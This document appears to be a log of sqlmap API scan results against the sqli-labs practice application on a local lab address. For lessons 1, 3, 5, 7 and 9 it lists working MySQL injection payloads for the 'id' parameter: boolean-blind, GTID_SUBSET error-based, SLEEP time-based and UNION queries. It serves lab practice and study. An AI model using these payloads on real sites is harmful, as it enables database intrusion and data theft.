@@ -1,0 +1,459 @@
+http://192.168.183.131/sqli-labs/Less-1/?id=1
+{
+    "data": [
+        {
+            "status": 1, 
+            "type": 0, 
+            "value": {
+                "url": "http://192.168.183.131:80/sqli-labs/Less-1/", 
+                "query": "id=1", 
+                "data": null
+            }
+        }, 
+        {
+            "status": 1, 
+            "type": 1, 
+            "value": [
+                {
+                    "dbms": "MySQL", 
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]", 
+                    "clause": [
+                        1, 
+                        8, 
+                        9
+                    ], 
+                    "notes": [], 
+                    "ptype": 2, 
+                    "dbms_version": [
+                        ">= 5.6"
+                    ], 
+                    "prefix": "'", 
+                    "place": "GET", 
+                    "os": null, 
+                    "conf": {
+                        "code": null, 
+                        "string": "Your", 
+                        "notString": null, 
+                        "titles": null, 
+                        "regexp": null, 
+                        "textOnly": null, 
+                        "optimize": null
+                    }, 
+                    "parameter": "id", 
+                    "data": {
+                        "1": {
+                            "comment": "", 
+                            "matchRatio": 0.957, 
+                            "trueCode": 200, 
+                            "title": "AND boolean-based blind - WHERE or HAVING clause", 
+                            "templatePayload": null, 
+                            "vector": "AND [INFERENCE]", 
+                            "falseCode": 200, 
+                            "where": 1, 
+                            "payload": "id=1' AND 6668=6668 AND 'IVXj'='IVXj"
+                        }, 
+                        "2": {
+                            "comment": "", 
+                            "matchRatio": 0.957, 
+                            "trueCode": null, 
+                            "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)", 
+                            "templatePayload": null, 
+                            "vector": "AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])", 
+                            "falseCode": null, 
+                            "where": 1, 
+                            "payload": "id=1' AND GTID_SUBSET(CONCAT(0x71786a7171,(SELECT (ELT(8013=8013,1))),0x7176767671),8013) AND 'IyzS'='IyzS"
+                        }, 
+                        "5": {
+                            "comment": "", 
+                            "matchRatio": 0.957, 
+                            "trueCode": 200, 
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)", 
+                            "templatePayload": null, 
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", 
+                            "falseCode": null, 
+                            "where": 1, 
+                            "payload": "id=1' AND (SELECT 7384 FROM (SELECT(SLEEP([SLEEPTIME])))ztpj) AND 'TupQ'='TupQ"
+                        }, 
+                        "6": {
+                            "comment": "[GENERIC_SQL_COMMENT]", 
+                            "matchRatio": 0.957, 
+                            "trueCode": null, 
+                            "title": "Generic UNION query (NULL) - 1 to 20 columns", 
+                            "templatePayload": null, 
+                            "vector": [
+                                2, 
+                                3, 
+                                "[GENERIC_SQL_COMMENT]", 
+                                "'", 
+                                " AND '[RANDSTR]'='[RANDSTR]", 
+                                "NULL", 
+                                2, 
+                                false, 
+                                null, 
+                                null, 
+                                null
+                            ], 
+                            "falseCode": null, 
+                            "where": 2, 
+                            "payload": "id=-6289' UNION ALL SELECT NULL,NULL,CONCAT(0x71786a7171,0x577458515a6e6b76434249476e6a427843475a4142734752546369426876517743594c4748746a53,0x7176767671)-- -"
+                        }
+                    }
+                }
+            ]
+        }
+    ], 
+    "success": true, 
+    "error": []
+}
+==========python sqlmapapi ==========
+http://192.168.183.131/sqli-labs/Less-3/?id=1
+{
+    "data": [
+        {
+            "status": 1, 
+            "type": 0, 
+            "value": {
+                "url": "http://192.168.183.131:80/sqli-labs/Less-3/", 
+                "query": "id=1", 
+                "data": null
+            }
+        }, 
+        {
+            "status": 1, 
+            "type": 1, 
+            "value": [
+                {
+                    "dbms": "MySQL", 
+                    "suffix": " AND ('[RANDSTR]'='[RANDSTR]", 
+                    "clause": [
+                        1, 
+                        8, 
+                        9
+                    ], 
+                    "notes": [], 
+                    "ptype": 2, 
+                    "dbms_version": [
+                        ">= 5.6"
+                    ], 
+                    "prefix": "')", 
+                    "place": "GET", 
+                    "os": null, 
+                    "conf": {
+                        "code": null, 
+                        "string": "Your", 
+                        "notString": null, 
+                        "titles": null, 
+                        "regexp": null, 
+                        "textOnly": null, 
+                        "optimize": null
+                    }, 
+                    "parameter": "id", 
+                    "data": {
+                        "1": {
+                            "comment": "", 
+                            "matchRatio": 0.957, 
+                            "trueCode": 200, 
+                            "title": "AND boolean-based blind - WHERE or HAVING clause", 
+                            "templatePayload": null, 
+                            "vector": "AND [INFERENCE]", 
+                            "falseCode": 200, 
+                            "where": 1, 
+                            "payload": "id=1') AND 6034=6034 AND ('ETsa'='ETsa"
+                        }, 
+                        "2": {
+                            "comment": "", 
+                            "matchRatio": 0.957, 
+                            "trueCode": null, 
+                            "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)", 
+                            "templatePayload": null, 
+                            "vector": "AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])", 
+                            "falseCode": null, 
+                            "where": 1, 
+                            "payload": "id=1') AND GTID_SUBSET(CONCAT(0x7176707a71,(SELECT (ELT(2162=2162,1))),0x717a707871),2162) AND ('AuSV'='AuSV"
+                        }, 
+                        "5": {
+                            "comment": "", 
+                            "matchRatio": 0.957, 
+                            "trueCode": 200, 
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)", 
+                            "templatePayload": null, 
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", 
+                            "falseCode": null, 
+                            "where": 1, 
+                            "payload": "id=1') AND (SELECT 6560 FROM (SELECT(SLEEP([SLEEPTIME])))APSs) AND ('Swcr'='Swcr"
+                        }, 
+                        "6": {
+                            "comment": "[GENERIC_SQL_COMMENT]", 
+                            "matchRatio": 0.957, 
+                            "trueCode": null, 
+                            "title": "Generic UNION query (NULL) - 1 to 20 columns", 
+                            "templatePayload": null, 
+                            "vector": [
+                                1, 
+                                3, 
+                                "[GENERIC_SQL_COMMENT]", 
+                                "')", 
+                                " AND ('[RANDSTR]'='[RANDSTR]", 
+                                "NULL", 
+                                2, 
+                                false, 
+                                null, 
+                                null, 
+                                null
+                            ], 
+                            "falseCode": null, 
+                            "where": 2, 
+                            "payload": "id=-3756') UNION ALL SELECT NULL,CONCAT(0x7176707a71,0x6370766767614c594364594d6d4b68444e58524148716d776e6c704d54466e7644464c457a46467a,0x717a707871),NULL-- -"
+                        }
+                    }
+                }
+            ]
+        }, 
+        {
+            "status": 1, 
+            "type": 2, 
+            "value": "back-end DBMS: MySQL >= 5.6"
+        }
+    ], 
+    "success": true, 
+    "error": []
+}
+==========python sqlmapapi ==========
+http://192.168.183.131/sqli-labs/Less-5/?id=1
+{
+    "data": [
+        {
+            "status": 1, 
+            "type": 0, 
+            "value": {
+                "url": "http://192.168.183.131:80/sqli-labs/Less-5/", 
+                "query": "id=1", 
+                "data": null
+            }
+        }, 
+        {
+            "status": 1, 
+            "type": 1, 
+            "value": [
+                {
+                    "dbms": "MySQL", 
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]", 
+                    "clause": [
+                        1, 
+                        8, 
+                        9
+                    ], 
+                    "notes": [], 
+                    "ptype": 2, 
+                    "dbms_version": [
+                        ">= 5.6"
+                    ], 
+                    "prefix": "'", 
+                    "place": "GET", 
+                    "os": null, 
+                    "conf": {
+                        "code": null, 
+                        "string": "are", 
+                        "notString": null, 
+                        "titles": null, 
+                        "regexp": null, 
+                        "textOnly": null, 
+                        "optimize": null
+                    }, 
+                    "parameter": "id", 
+                    "data": {
+                        "1": {
+                            "comment": "", 
+                            "matchRatio": 0.967, 
+                            "trueCode": 200, 
+                            "title": "AND boolean-based blind - WHERE or HAVING clause", 
+                            "templatePayload": null, 
+                            "vector": "AND [INFERENCE]", 
+                            "falseCode": 200, 
+                            "where": 1, 
+                            "payload": "id=1' AND 1296=1296 AND 'pImm'='pImm"
+                        }, 
+                        "2": {
+                            "comment": "", 
+                            "matchRatio": 0.967, 
+                            "trueCode": null, 
+                            "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)", 
+                            "templatePayload": null, 
+                            "vector": "AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])", 
+                            "falseCode": null, 
+                            "where": 1, 
+                            "payload": "id=1' AND GTID_SUBSET(CONCAT(0x71716a7a71,(SELECT (ELT(5902=5902,1))),0x716a716a71),5902) AND 'ygEQ'='ygEQ"
+                        }, 
+                        "5": {
+                            "comment": "", 
+                            "matchRatio": 0.967, 
+                            "trueCode": 200, 
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)", 
+                            "templatePayload": null, 
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", 
+                            "falseCode": null, 
+                            "where": 1, 
+                            "payload": "id=1' AND (SELECT 7457 FROM (SELECT(SLEEP([SLEEPTIME])))IWuA) AND 'UQpP'='UQpP"
+                        }
+                    }
+                }
+            ]
+        }, 
+        {
+            "status": 1, 
+            "type": 2, 
+            "value": "back-end DBMS: MySQL >= 5.6"
+        }
+    ], 
+    "success": true, 
+    "error": []
+}
+==========python sqlmapapi ==========
+http://192.168.183.131/sqli-labs/Less-7/?id=1
+{
+    "data": [
+        {
+            "status": 1, 
+            "type": 0, 
+            "value": {
+                "url": "http://192.168.183.131:80/sqli-labs/Less-7/", 
+                "query": "id=1", 
+                "data": null
+            }
+        }, 
+        {
+            "status": 1, 
+            "type": 1, 
+            "value": [
+                {
+                    "dbms": "MySQL", 
+                    "suffix": " AND ('[RANDSTR]'='[RANDSTR]", 
+                    "clause": [
+                        1, 
+                        8, 
+                        9
+                    ], 
+                    "notes": [], 
+                    "ptype": 2, 
+                    "dbms_version": [
+                        ">= 5.0.12"
+                    ], 
+                    "prefix": "')", 
+                    "place": "GET", 
+                    "os": null, 
+                    "conf": {
+                        "code": null, 
+                        "string": "Use", 
+                        "notString": null, 
+                        "titles": null, 
+                        "regexp": null, 
+                        "textOnly": null, 
+                        "optimize": null
+                    }, 
+                    "parameter": "id", 
+                    "data": {
+                        "1": {
+                            "comment": "", 
+                            "matchRatio": null, 
+                            "trueCode": 200, 
+                            "title": "AND boolean-based blind - WHERE or HAVING clause", 
+                            "templatePayload": null, 
+                            "vector": "AND [INFERENCE]", 
+                            "falseCode": 200, 
+                            "where": 1, 
+                            "payload": "id=1') AND 7916=7916 AND ('HIRp'='HIRp"
+                        }, 
+                        "5": {
+                            "comment": "", 
+                            "matchRatio": null, 
+                            "trueCode": 200, 
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)", 
+                            "templatePayload": null, 
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", 
+                            "falseCode": null, 
+                            "where": 1, 
+                            "payload": "id=1') AND (SELECT 1654 FROM (SELECT(SLEEP([SLEEPTIME])))GlQw) AND ('bTnL'='bTnL"
+                        }
+                    }
+                }
+            ]
+        }
+    ], 
+    "success": true, 
+    "error": []
+}
+==========python sqlmapapi ==========
+http://192.168.183.131/sqli-labs/Less-9/?id=1
+{
+    "data": [
+        {
+            "status": 1, 
+            "type": 0, 
+            "value": {
+                "url": "http://192.168.183.131:80/sqli-labs/Less-9/", 
+                "query": "id=1", 
+                "data": null
+            }
+        }, 
+        {
+            "status": 1, 
+            "type": 1, 
+            "value": [
+                {
+                    "dbms": "MySQL", 
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]", 
+                    "clause": [
+                        1, 
+                        8, 
+                        9
+                    ], 
+                    "notes": [], 
+                    "ptype": 2, 
+                    "dbms_version": [
+                        ">= 5.0.12"
+                    ], 
+                    "prefix": "'", 
+                    "place": "GET", 
+                    "os": null, 
+                    "conf": {
+                        "code": null, 
+                        "string": null, 
+                        "notString": null, 
+                        "titles": null, 
+                        "regexp": null, 
+                        "textOnly": null, 
+                        "optimize": null
+                    }, 
+                    "parameter": "id", 
+                    "data": {
+                        "1": {
+                            "comment": "", 
+                            "matchRatio": 0.974, 
+                            "trueCode": 200, 
+                            "title": "AND boolean-based blind - WHERE or HAVING clause", 
+                            "templatePayload": null, 
+                            "vector": "AND [INFERENCE]", 
+                            "falseCode": 200, 
+                            "where": 1, 
+                            "payload": "id=1' AND 6057=6057 AND 'Txhd'='Txhd"
+                        }, 
+                        "5": {
+                            "comment": "", 
+                            "matchRatio": 0.974, 
+                            "trueCode": 200, 
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)", 
+                            "templatePayload": null, 
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", 
+                            "falseCode": null, 
+                            "where": 1, 
+                            "payload": "id=1' AND (SELECT 6813 FROM (SELECT(SLEEP([SLEEPTIME])))gnWn) AND 'jylV'='jylV"
+                        }
+                    }
+                }
+            ]
+        }
+    ], 
+    "success": true, 
+    "error": []
+}
+==========python sqlmapapi ==========
